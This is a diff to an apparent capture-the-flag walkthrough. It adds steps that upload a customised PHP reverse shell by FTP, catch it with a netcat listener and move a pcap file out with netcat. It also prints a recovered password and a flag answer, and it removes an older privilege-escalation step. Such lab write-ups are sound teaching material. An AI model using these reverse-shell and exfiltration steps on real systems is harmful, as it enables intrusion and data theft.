@@ -112,39 +112,98 @@ That's a pretty info, Maya can be an username!
 
 <figure><img src=".gitbook/assets/Schermata del 2023-07-29 23-31-09.png" alt=""><figcaption><p>important.jpg</p></figcaption></figure>
 
+Using gobuster we try to find hidden path
 
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-31-10.png" alt=""><figcaption></figcaption></figure>
 
+The best solution is to create a .php reverse shell and put in ftp folder via FTP
 
-
-
-
-{% hint style="info" %}
-
-{% endhint %}
-
-
-
-<figure><img src=".gitbook/assets/Schermata del 2023-07-29 00-41-30.png" alt=""><figcaption></figcaption></figure>
-
-We can find exploit.exe file using where command and run it to escalate privilege!
+We copy php-reverse-shell.php just ready from php webshells folder
 
 ```bash
-where /r C:\ exploit.exe
-c:\inetpub\wwwroot>exploit.exe
-whoami
-nt authority\system
+cp /usr/share/webshells/php/php-reverse-shell.php .
 ```
+
+and custom it using our IP and Port:
+
+```bash
+ano php-reverse-shell.php
+```
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-51-58.png" alt=""><figcaption></figcaption></figure>
+
+Rename it:
+
+```bash
+mv php-reverse-shell.php shell.php
+```
+
+and put in ftp folder via FTP:
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 10-54-53.png" alt=""><figcaption></figcaption></figure>
+
+and start netcat on the same reverse shell port (444):
+
+```bash
+nc -lvnp 444
+```
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-03-57.png" alt=""><figcaption></figcaption></figure>
+
+Now, we're in! Check flags here..
 
 <div align="left">
 
-<figure><img src=".gitbook/assets/Schermata del 2023-07-29 00-47-23.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-09-08.png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
+We see an interesting file "recipe.txt", and we find information that we need!
+
+```bash
+cat recipe.txt
+```
+
+_Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love._
+
+{% hint style="info" %}
+love
+{% endhint %}
+
 ### Task 3 - What are the contents of user.txt?
 
-\
+We quickly try to find user.txt flag using find command:\
 
+
+```bash
+find / -iname 'user.txt' 2>/dev/null
+```
+
+but we don't find anything! Then we need to explore files or escalate privileges
+
+We notes an interesting dir called: incidents, with suspicious.pcapng (wireshark ext), we try to get it, but permission is denied!
+
+Then, we can use netcat to open a new connection and transfer it:
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-25-20.png" alt=""><figcaption></figcaption></figure>
+
+We can analyze susp.pcap file using wireshark or strings:
+
+```bash
+strings susp.pcap
+```
+
+<figure><img src=".gitbook/assets/Schermata del 2023-07-30 11-33-24.png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
+We see this psw: c4ntg3t3n0ughsp1c3 we can try to use it!
 
 
 
